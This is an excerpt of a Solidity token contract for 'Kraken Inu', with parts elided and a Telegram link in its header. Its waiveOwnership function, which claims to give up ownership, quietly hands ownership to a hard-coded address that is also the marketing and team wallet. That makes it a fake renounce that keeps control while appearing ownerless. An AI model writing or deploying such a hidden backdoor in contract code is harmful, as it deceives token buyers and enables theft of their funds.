...
/**
Telegram : https://t.me/KrakenInubsc
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x43D3248eE6C8C6d83d659b7f55BC536cBFc8DB8d);
    }
...
contract KrakenInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Kraken Inu";
    string private _symbol = "KRAKEN";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x43D3248eE6C8C6d83d659b7f55BC536cBFc8DB8d);
    address payable private teamWalletAddress = payable(0x43D3248eE6C8C6d83d659b7f55BC536cBFc8DB8d);
